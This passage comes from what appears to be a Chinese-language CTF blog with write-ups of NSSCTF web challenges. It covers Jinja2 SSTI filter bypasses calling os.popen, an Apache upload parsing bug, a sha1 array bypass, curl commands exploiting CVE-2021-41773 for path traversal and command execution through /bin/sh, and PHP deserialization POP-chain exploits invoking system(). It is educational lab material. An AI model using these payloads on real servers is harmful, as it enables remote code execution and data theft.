    <span class="token string">"format"</span><span class="token punctuation">,</span> <span class="token string">"list"</span><span class="token punctuation">,</span> <span class="token string">"lower"</span><span class="token punctuation">,</span> <span class="token string">"slice"</span><span class="token punctuation">,</span> <span class="token string">"striptags"</span><span class="token punctuation">,</span> <span class="token string">"trim"</span><span class="token punctuation">,</span> <span class="token string">"xmlattr"</span><span class="token punctuation">,</span>
    <span class="token string">"tojson"</span><span class="token punctuation">,</span> <span class="token string">"set"</span><span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"chr"</span>
<span class="token punctuation">]</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"try to check /test?url=xxx"</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">testing</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>url
    <span class="token keyword">for</span> black <span class="token keyword">in</span> url_black_list<span class="token punctuation">:</span>
        <span class="token keyword">if</span> black <span class="token keyword">in</span> url<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"&lt;h1>do a real p1g&lt;/h1>"</span>
    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> black <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>
        <span class="token keyword">if</span> black <span class="token keyword">in</span> url<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string">"&lt;h1>do a real p1g&lt;/h1>"</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">"&lt;h1>this is your url &#123;&#125;&lt;/h1>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8899</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>空格被过滤了，可以用%09绕过</p>
<p>flag和<code>*</code>被过滤了，可以用<code>?</code>通配符绕过</p>
<p>payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>test?url<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token keyword">print</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\u0067\u0065\u0074"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"popen"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"cat%09/f???"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="UUCTF-2022-新生赛-ez-upload"><a href="#UUCTF-2022-新生赛-ez-upload" class="headerlink" title="[UUCTF 2022 新生赛]ez_upload"></a>[UUCTF 2022 新生赛]ez_upload</h1><blockquote>
<p>文件上传之AddHandler导致的解析漏洞</p>
</blockquote>
<p>上传界面，测试了一下发现不能传.php后缀</p>
<p>然后看一下题目的环境版本Apache&#x2F;2.4.10 (Debian)+PHP&#x2F;5.6.28</p>
<p>我们知道这个版本是存在apache httpd解析漏洞的，三种解析漏洞测试过去之后发现只有AddHandler导致的解析漏洞能够成功解析</p>
<p>即<code>文件名.png.php</code></p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231023111937735.png" alt="image-20231023111937735"></p>
<p>然后就是命令执行了</p>
<hr>
<h1 id="极客大挑战-2020-welcome"><a href="#极客大挑战-2020-welcome" class="headerlink" title="[极客大挑战 2020]welcome"></a>[极客大挑战 2020]welcome</h1><blockquote>
<p>信息收集</p>
</blockquote>
<p>一开始访问网页报405，还以为是环境坏了</p>
<p>回来看题目描述1.In addition to the GET request method, there is another common request method…</p>
<p>应该是让我们用post方式访问网页</p>
<p>抓包改为post请求再发包</p>
<p>得到源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.1 405 Method Not Allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'roam2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// collect information from phpinfo!</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来就是sha1强比较，直接数组绕过即可</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">roam1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>roam2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在phpinfo里寻找有用的信息</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231023113112721.png" alt="image-20231023113112721"></p>
<p>发现auto_prepend_file被设置为了f1444aagggg.php，即所有页面的顶部都require了个f1444aagggg.php</p>
<p>直接访问f1444aagggg.php，发现返回404</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231023113525086.png" alt="image-20231023113525086"></p>
<p>逆天，最后在响应头里找到flag</p>
<hr>
<h1 id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h1><blockquote>
<p>CVE-2021-41773</p>
</blockquote>
<p>vulhub上的漏洞利用：<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/httpd/CVE-2021-41773/README.zh-cn.md</a></p>
<p>进入题目，看到了Apache默认的<code>It works!</code>页面</p>
<p>先看server版本Apache&#x2F;2.4.49 (Unix)</p>
<p>这个版本的服务器存在CVE-2021-41773</p>
<p>先尝试读取文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> --path-as-is http://node4.anna.nssctf.cn:28819/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>返回403，看来是读不了</p>
<p>再测试是否存在命令执行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">--data</span> <span class="token string">"echo;id"</span> http://node4.anna.nssctf.cn:28819/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功返回id</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231023114613851.png" alt="image-20231023114613851"></p>
<p>那就直接命令执行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">--data</span> <span class="token string">"echo;ls /"</span> http://node4.anna.nssctf.cn:28819/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>flag在&#x2F;flag_is_here中，但是里面有一堆文件夹，这里需要用grep命令过滤一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">--data</span> <span class="token string">"echo;grep -r 'NSS' /flag_is_here"</span> http://node4.anna.nssctf.cn:28819/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231023115035517.png" alt="image-20231023115035517"></p>
<p>得到flag</p>
<hr>
<h1 id="SWPUCTF-2022-新生赛-ez-1zpop"><a href="#SWPUCTF-2022-新生赛-ez-1zpop" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_1zpop"></a>[SWPUCTF 2022 新生赛]ez_1zpop</h1><blockquote>
<p>反序列化</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">dxg</span>
<span class="token punctuation">&#123;</span>
   <span class="token keyword">function</span> <span class="token function-definition function">fmm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">lt</span>
<span class="token punctuation">&#123;</span>
   <span class="token keyword">public</span> <span class="token variable">$impo</span><span class="token operator">=</span><span class="token string single-quoted-string">'hi'</span><span class="token punctuation">;</span>
   <span class="token keyword">public</span> <span class="token variable">$md51</span><span class="token operator">=</span><span class="token string single-quoted-string">'weclome'</span><span class="token punctuation">;</span>
   <span class="token keyword">public</span> <span class="token variable">$md52</span><span class="token operator">=</span><span class="token string single-quoted-string">'to NSS'</span><span class="token punctuation">;</span>
   <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dxg</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
   <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
      <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dxg</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span><span class="token operator">-></span><span class="token function">fmm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>

   <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">md51</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">md52</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">md51</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">md52</span><span class="token punctuation">)</span>
         <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span><span class="token operator">-></span><span class="token function">fmm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
   <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
      <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">fin</span>
<span class="token punctuation">&#123;</span>
   <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
   <span class="token keyword">public</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'https://www.ctfer.vip'</span><span class="token punctuation">;</span>
   <span class="token keyword">public</span> <span class="token variable">$title</span><span class="token punctuation">;</span>
   <span class="token keyword">function</span> <span class="token function-definition function">fmm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
   <span class="token punctuation">&#123;</span>
      <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>
      <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">title</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NSS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token variable">$Data</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NSS'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
   <span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>出口在<code>fin::fmm</code>的<code>$b($this-&gt;title);</code></p>
<p>链子：<code>lt::__destruct -&gt; lt::__toString -&gt; fin::fmm </code></p>
<p>PHP版本5.5.38，有cve-2016-7124绕过wakeup</p>
<p>md5弱比较</p>
<p>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">dxg</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">lt</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$impo</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'hi'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$md51</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'QNKCDZO'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$md52</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'240610708'</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">impo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">fin</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">fin</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'https://www.ctfer.vip'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">lt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// O:2:"lt":3:&#123;s:4:"impo";O:3:"fin":3:&#123;s:1:"a";s:6:"system";s:3:"url";s:21:"https://www.ctfer.vip";s:5:"title";s:4:"ls /";&#125;s:4:"md51";s:7:"QNKCDZO";s:4:"md52";s:9:"240610708";&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"lt"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"impo"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"fin"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"url"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">21</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"https://www.ctfer.vip"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"md51"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"QNKCDZO"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"md52"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"240610708"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="HZNUCTF-2023-preliminary-flask"><a href="#HZNUCTF-2023-preliminary-flask" class="headerlink" title="[HZNUCTF 2023 preliminary]flask"></a>[HZNUCTF 2023 preliminary]flask</h1><blockquote>
<p>ssti</p>
</blockquote>
<p>进入题目，只告诉我们&#x2F;?name&#x3D;</p>
<p>尝试ssti注入<code>&#123;&#123;7*7&#125;&#125;</code>，网页返回500，再尝试<code>&#123;%print(7*7)%&#125;</code>，返回<code>hello! &#125;%)7*7(tnirp%&#123;</code></p>
<p>明显是被逆序处理了，那我们尝试逆序传入<code>&#123;&#123;7*7&#125;&#125;</code>，成功返回49</p>
<p>接下来我们直接测试payload，开个python终端把要传进去的payload字符串最后再加上个<code>[::-1]</code>即可逆序输出</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> <span class="token string">'&#123;&#123;"".__class__.__bases__[0].__subclasses__()&#125;&#125;'</span><span class="token punctuation">[</span>::-1<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>先找&lt;class ‘os._wrap_close’&gt;，注意由于html标签原因，这里要在ctrl+u里面才能查看</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>?name<span class="token operator">=</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__sessalcbus__<span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token number">0</span><span class="token punctuation">[</span>__sesab__<span class="token punctuation">.</span>__ssalc__<span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>在第133个，直接命令执行</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>?name<span class="token operator">=</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span>daer<span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token string">"/ sl"</span><span class="token punctuation">(</span><span class="token punctuation">]</span><span class="token string">"nepop"</span><span class="token punctuation">[</span>__slabolg__<span class="token punctuation">.</span>__tini__<span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token number">231</span><span class="token punctuation">[</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__sessalcbus__<span class="token punctuation">.</span><span class="token punctuation">]</span><span class="token number">0</span><span class="token punctuation">[</span>__sesab__<span class="token punctuation">.</span>__ssalc__<span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最后发现flag在环境变量env里面</p>
<hr>
<h1 id="UUCTF-2022-新生赛-ez-unser"><a href="#UUCTF-2022-新生赛-ez-unser" class="headerlink" title="[UUCTF 2022 新生赛]ez_unser"></a>[UUCTF 2022 新生赛]ez_unser</h1><blockquote>
<p>反序列化绕过wakeup</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">###very___so___easy!!!!</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token punctuation">;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
